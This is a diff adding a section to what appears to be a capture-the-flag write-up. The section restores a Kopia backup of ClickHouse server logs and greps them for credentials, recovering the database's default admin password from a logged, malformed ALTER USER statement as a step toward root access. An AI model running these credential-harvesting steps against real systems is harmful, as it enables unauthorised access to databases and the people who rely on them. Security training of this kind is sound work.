@@ -1357,6 +1357,47 @@ martin_cole@stream:/home/martin_cole/ch-logs
 ```
 
 Key finding: a single snapshot backing up `/home/martin_cole/ch-logs`, a set of ClickHouse log files. Restoring it should expose the server logs, which routinely capture an admin password from a malformed `ALTER USER` statement.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 5.3 Recover the ClickHouse default Password from Restored Logs
+
+Restore the snapshot locally and grep the ClickHouse logs for any password or `ALTER USER` statement.
+
+**Command:**
+
+```bash
+kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/ch-logs
+ls -la /tmp/ch-logs
+grep -iaE "identified by|password" /tmp/ch-logs/*.log* 2>/dev/null
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `kopia snapshot restore <id> /tmp/ch-logs` | Restore | Writes the snapshot's files into `/tmp/ch-logs`. |
+| `grep -iaE "identified by|password"` | Search logs | Case-insensitively searches the (possibly binary) logs for credential-bearing lines. |
+
+**Result:**
+
+```shell
+Restored 2 files, 1 directories and 0 symbolic links (1.4 MB).
+
+clickhouse-server.err.log
+clickhouse-server.log
+
+clickhouse-server.err.log:... <Error> DynamicQueryHandler: Code: 62. DB::Exception:
+Double quoted string is not closed: Syntax error: failed at position 1
+("ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4 ;): (SYNTAX_ERROR)
+```
+
+Key finding: the ClickHouse `default` account password is `N3v3rs33nD4T4`. An operator ran `ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4` with an unclosed quote; ClickHouse rejected the statement and logged it verbatim, leaking the intended password. The `default` account is the administrative ClickHouse user, so the next task is to find what runs as root and relies on ClickHouse.
+
 
 <div align="center">
 <br>
